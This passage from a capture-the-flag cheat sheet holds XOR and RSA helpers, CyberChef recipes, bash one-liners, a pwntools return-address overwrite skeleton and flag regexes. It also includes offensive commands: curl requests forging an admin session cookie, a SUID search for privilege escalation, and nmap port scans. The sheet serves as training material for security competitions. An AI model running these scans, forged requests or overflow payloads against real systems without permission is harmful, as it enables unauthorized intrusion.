    return bytes(a ^ b for a, b in zip(data, (key * (len(data)//len(key)+1))[:len(data)]))

xor(b'\x41\x42\x43', b'\x10')           # XOR with single byte
xor(ciphertext, b'key')                  # XOR with repeating key

# Single-byte XOR brute force
for k in range(256):
    result = bytes(b ^ k for b in ciphertext)
    if b'flag' in result.lower():
        print(hex(k), result)

# Integer to/from bytes
import math
n = 12345678
n.to_bytes(math.ceil(n.bit_length()/8), 'big')   # Int to bytes (big-endian)
int.from_bytes(b'\x00\xbc\x61\x4e', 'big')       # Bytes to int

# RSA skeleton
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
# n, e, c given:
# d = pow(e, -1, (p-1)*(q-1))  -- requires factoring n
# m = pow(c, d, n)
# flag = long_to_bytes(m)
```

### CyberChef Recipes

CyberChef operations can be chained in the browser at https://gchq.github.io/CyberChef

**Common recipes (paste into "Recipe" or use as URL):**
- From Base64 → To Hex: `[{"op":"From Base64"},{"op":"To Hex"}]`
- Detect and strip encodings: Use the "Magic" operation with depth 3+
- XOR with known key: `[{"op":"XOR","args":[{"option":"Hex","string":"deadbeef"},"Standard",false]}]`
- Decrypt AES-CBC: `[{"op":"AES Decrypt","args":[{"option":"Hex","string":"key"},{"option":"Hex","string":"iv"},"CBC","Raw","Raw"]}]`
- Extract URLs: `[{"op":"Extract URLs","args":[true]}]`

### Bash One-Liners

```bash
# File analysis
file mystery_file                         # Identify file type
xxd mystery_file | head -20               # Hex dump
strings mystery_file | grep -i flag       # Find flag strings
binwalk -e mystery_file                   # Extract embedded files
exiftool mystery_file                     # Metadata

# Encoding/decoding
echo "SGVsbG8=" | base64 -d              # Base64 decode
echo "48656c6c6f" | xxd -r -p            # Hex to ASCII
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # ROT13

# Hashing
echo -n "password" | md5sum
echo -n "password" | sha256sum
echo -n "password" | sha1sum

# Network
curl -v -b "session=admin" http://target.com   # Request with cookie
curl -X POST -d "user=admin&pass=test" http://target.com/login
wget -q -O - http://target.com/robots.txt

# Crypto helpers
python3 -c "from Crypto.Util.number import *; print(long_to_bytes(123456789))"

# Find SUID binaries (privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Grep recursively for patterns
grep -r "flag{" ./extracted_files/
grep -riE "flag\{[^}]+\}" ./

# Port scanning
nmap -sV -sC -oN scan.txt target.com
nmap -p- --min-rate 5000 target.com
```

### pwntools Skeleton

```python
from pwn import *

# Set target architecture
context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'  # Verbose output

# Connect to target
p = process('./binary')              # Local
# p = remote('ctf.example.com', 1337)  # Remote
# p = gdb.debug('./binary', '''
#     break main
#     continue
# ''')

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Cyclic pattern for offset finding
pattern = cyclic(200)
offset = cyclic_find(0x6161616c)     # Pass value of $rip/$rsp after crash

# Build payload
payload = flat(
    b'A' * offset,
    p64(elf.symbols['win']),         # Overwrite return address
)

p.sendlineafter(b'> ', payload)
p.interactive()
```

### Quick Flag Regex Patterns

```bash
# Common CTF flag formats
grep -oE 'flag\{[^}]+\}' file
grep -oE 'CTF\{[^}]+\}' file
grep -oE 'picoCTF\{[^}]+\}' file
grep -oE 'HTB\{[^}]+\}' file
grep -oE '[A-Z0-9]{2,10}\{[^}]+\}' file   # Generic format

# In Wireshark tshark
tshark -r capture.pcap -Y "frame contains \"flag{\"" -T fields -e data.text
```

---

*Last updated: April 2026 | Maintained by TeamStarWolf*
